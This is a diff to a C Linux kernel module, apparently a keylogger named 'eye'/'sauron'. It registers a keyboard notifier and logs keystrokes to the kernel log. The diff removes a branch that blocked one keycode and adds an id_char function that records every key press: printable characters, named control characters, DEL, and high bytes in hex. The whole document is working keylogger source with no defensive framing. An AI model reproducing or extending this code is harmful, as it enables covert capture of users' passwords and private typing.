@@ -1,5 +1,6 @@
 #include "../include/eye.h"
 #include "../include/ops.h"
+#include "../include/char.h"
 
 /* Kernel Module License */
 MODULE_LICENSE("GPL");
@@ -26,6 +27,7 @@ static const struct file_operations fops = {
 static int start_eye(void);
 static void end_eye(void);
 static int sauron_notify(struct notifier_block *nb, unsigned long code, void *data);
+static uint8_t id_char(char n);
 void ring_on(void);
 void ring_off(void);
 
@@ -66,21 +68,35 @@ static int sauron_notify(struct notifier_block *nb, unsigned long code, void *ra
 
     if (code == KBD_KEYSYM && data->down)
     {
-        if (c == 0x01)
-            printk("\n");
-        else if (c >= 0x20 && c < 0x7f)
-            printk(KERN_CONT "%c", c);
-    }
-    else if (code == KBD_KEYCODE && data->down)
-    {
-        if (c == 0x2d)
-        {
-            printk(KERN_CONT "bad_x");
-            return NOTIFY_STOP;
-        }
+        id_char(c);
     }
 
     return NOTIFY_OK;
+}
+
+static uint8_t id_char(char n)
+{
+    uint8_t c = (uint8_t)n;
+    if (c >= 0x20 && c < 0x7f)
+    {
+        printk(KERN_CONT "%c", c);
+    }
+    else if (c < 0x20)
+    {
+        printk(KERN_CONT "<%s>", ascii_codes[c]);
+        if (c == 0x0a)
+            printk(KERN_CONT "\n");
+    }
+    else if (c == 0x7f)
+    {
+        printk(KERN_CONT "<DEL>");
+    }
+    else if (c > 0x7f && c <= 0xff)
+    {
+        printk(KERN_CONT "<%02x>", c);
+    }
+
+    return c;
 }
 
 void ring_on(void)
